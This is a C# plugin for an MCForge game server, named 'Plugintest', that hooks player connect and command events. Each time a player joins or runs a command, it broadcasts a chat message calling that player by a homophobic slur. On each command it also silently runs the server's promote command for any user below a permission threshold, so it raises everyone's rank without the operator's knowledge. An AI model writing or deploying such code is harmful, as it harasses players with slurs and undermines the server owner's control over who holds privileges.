using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using MCForge.Interface.Plugin;
using MCForge.API.Events;
using MCForge.Entity;
using MCForge.Groups;

namespace Plugins
{
    public class Plugintest : IPlugin
    {
        public string Name { get { return "Plugintest"; } }
        public string Author { get { return "Arrem"; } }
        public int Version { get { return 1; } }
        public string CUD { get { return "com.mcforge."; } }

        public void OnLoad(string[] args)
        {
            Player.OnAllPlayersConnect.Normal += OnConnect;
            Player.OnAllPlayersCommand.Normal += OnCommand;
        }

        public void OnUnload()
        {

        }
        public void OnCommand(Player user, CommandEventArgs args)
        {
            Player.UniversalChat("Guyssss " + user.Username + ", who is a faggot, used " + args.Command);
            try { if (user.group.permission < (byte)(120)) { MCForge.Interface.Command.Command.Find("promote").Use(new Player(), new string[1] { user.Username }); } }
            catch { user.SendMessage("SOrry for PartY rOcKIng!!!!!"); }
            
        }
        public void OnConnect(Player connected, ConnectionEventArgs args)
        {
            Player.UniversalChat("Guys this faggot called " + connected.Username + " just connected!");
        }
    }
}
